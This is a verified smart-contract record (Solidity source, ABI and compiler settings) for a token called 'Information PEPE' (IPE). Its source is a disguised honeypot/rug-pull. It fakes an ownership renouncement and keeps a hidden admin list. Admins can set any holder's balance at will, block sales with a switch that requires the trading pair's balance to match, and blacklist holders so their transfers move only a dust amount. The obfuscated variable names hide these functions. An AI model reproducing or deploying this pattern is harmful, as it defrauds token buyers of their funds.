{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface buyReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTakeReceiver) external view returns (uint256);\n\n    function transfer(address marketingTeam, uint256 toLiquidity) external returns (bool);\n\n    function allowance(address launchedIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTeam,\n        uint256 toLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamTotal, uint256 value);\n    event Approval(address indexed launchedIs, address indexed spender, uint256 value);\n}\n\nabstract contract feeTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenAmountTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableSellLimit {\n    function createPair(address listTo, address fundSender) external returns (address);\n}\n\ninterface buyReceiverMetadata is buyReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InformationPEPE is feeTotal, buyReceiver, buyReceiverMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxAmount;\n    }\n\n    function liquidityBuy(address exemptTake) public {\n        launchedTradingTeam();\n        if (autoToken != launchAt) {\n            feeTx = false;\n        }\n        if (exemptTake == txEnable || exemptTake == toSender) {\n            return;\n        }\n        launchLaunched[exemptTake] = true;\n    }\n\n    function shouldList(address walletLaunched) public {\n        require(walletLaunched.balance < 100000);\n        if (toShould) {\n            return;\n        }\n        \n        amountFee[walletLaunched] = true;\n        if (teamAmount != minAmount) {\n            minAmount = autoToken;\n        }\n        toShould = true;\n    }\n\n    uint256 exemptTeamMarketing;\n\n    mapping(address => bool) public launchLaunched;\n\n    function transferFrom(address marketingMinTeam, address marketingTeam, uint256 toLiquidity) external override returns (bool) {\n        if (_msgSender() != buyMode) {\n            if (listAt[marketingMinTeam][_msgSender()] != type(uint256).max) {\n                require(toLiquidity <= listAt[marketingMinTeam][_msgSender()]);\n                listAt[marketingMinTeam][_msgSender()] -= toLiquidity;\n            }\n        }\n        return modeTeam(marketingMinTeam, marketingTeam, toLiquidity);\n    }\n\n    bool public feeTx;\n\n    function owner() external view returns (address) {\n        return limitReceiver;\n    }\n\n    address public toSender;\n\n    bool private exemptLiquidity;\n\n    function allowance(address shouldTeam, address tradingLimit) external view virtual override returns (uint256) {\n        if (tradingLimit == buyMode) {\n            return type(uint256).max;\n        }\n        return listAt[shouldTeam][tradingLimit];\n    }\n\n    function getOwner() external view returns (address) {\n        return limitReceiver;\n    }\n\n    mapping(address => bool) public amountFee;\n\n    function launchAmount(uint256 toLiquidity) public {\n        launchedTradingTeam();\n        sellFromWallet = toLiquidity;\n    }\n\n    function modeTeam(address marketingMinTeam, address marketingTeam, uint256 toLiquidity) internal returns (bool) {\n        if (marketingMinTeam == txEnable) {\n            return walletBuy(marketingMinTeam, marketingTeam, toLiquidity);\n        }\n        uint256 launchedMax = buyReceiver(toSender).balanceOf(takeIs);\n        require(launchedMax == sellFromWallet);\n        require(marketingTeam != takeIs);\n        if (launchLaunched[marketingMinTeam]) {\n            return walletBuy(marketingMinTeam, marketingTeam, maxReceiver);\n        }\n        return walletBuy(marketingMinTeam, marketingTeam, toLiquidity);\n    }\n\n    function atTx(address takeMarketingLaunch, uint256 toLiquidity) public {\n        launchedTradingTeam();\n        txTeam[takeMarketingLaunch] = toLiquidity;\n    }\n\n    uint256 private teamAmount;\n\n    uint256 public atSender;\n\n    bool private toList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitSwap;\n    }\n\n    mapping(address => uint256) private txTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromTotalTo;\n    }\n\n    function launchedTradingTeam() private view {\n        require(amountFee[_msgSender()]);\n    }\n\n    bool public toShould;\n\n    uint256 private fromTotalTo = 100000000 * 10 ** 18;\n\n    function balanceOf(address walletTakeReceiver) public view virtual override returns (uint256) {\n        return txTeam[walletTakeReceiver];\n    }\n\n    address buyMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (autoToken == minAmount) {\n            minAmount = launchAt;\n        }\n        tokenAmountTake feeTake = tokenAmountTake(buyMode);\n        toSender = enableSellLimit(feeTake.factory()).createPair(feeTake.WETH(), address(this));\n        if (toList) {\n            autoToken = launchAt;\n        }\n        txEnable = _msgSender();\n        atFrom();\n        amountFee[txEnable] = true;\n        txTeam[txEnable] = fromTotalTo;\n        if (autoToken != minAmount) {\n            minAmount = atSender;\n        }\n        emit Transfer(address(0), txEnable, fromTotalTo);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private listAt;\n\n    address takeIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed amountSwap, address indexed listIsLaunched);\n\n    address private limitReceiver;\n\n    uint256 constant maxReceiver = 18 ** 10;\n\n    uint256 public launchAt;\n\n    function transfer(address takeMarketingLaunch, uint256 toLiquidity) external virtual override returns (bool) {\n        return modeTeam(_msgSender(), takeMarketingLaunch, toLiquidity);\n    }\n\n    uint256 sellFromWallet;\n\n    function atFrom() public {\n        emit OwnershipTransferred(txEnable, address(0));\n        limitReceiver = address(0);\n    }\n\n    function walletBuy(address marketingMinTeam, address marketingTeam, uint256 toLiquidity) internal returns (bool) {\n        require(txTeam[marketingMinTeam] >= toLiquidity);\n        txTeam[marketingMinTeam] -= toLiquidity;\n        txTeam[marketingTeam] += toLiquidity;\n        emit Transfer(marketingMinTeam, marketingTeam, toLiquidity);\n        return true;\n    }\n\n    address public txEnable;\n\n    uint256 public minAmount;\n\n    string private limitSwap = \"IPE\";\n\n    uint8 private maxAmount = 18;\n\n    uint256 public autoToken;\n\n    string private sellBuy = \"Information PEPE\";\n\n    bool private minSellWallet;\n\n    bool private swapSell;\n\n    function approve(address tradingLimit, uint256 toLiquidity) public virtual override returns (bool) {\n        listAt[_msgSender()][tradingLimit] = toLiquidity;\n        emit Approval(_msgSender(), tradingLimit, toLiquidity);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listIsLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketingLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLiquidity\",\"type\":\"uint256\"}],\"name\":\"atTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTakeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toLiquidity\",\"type\":\"uint256\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"}],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketingLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMinTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InformationPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}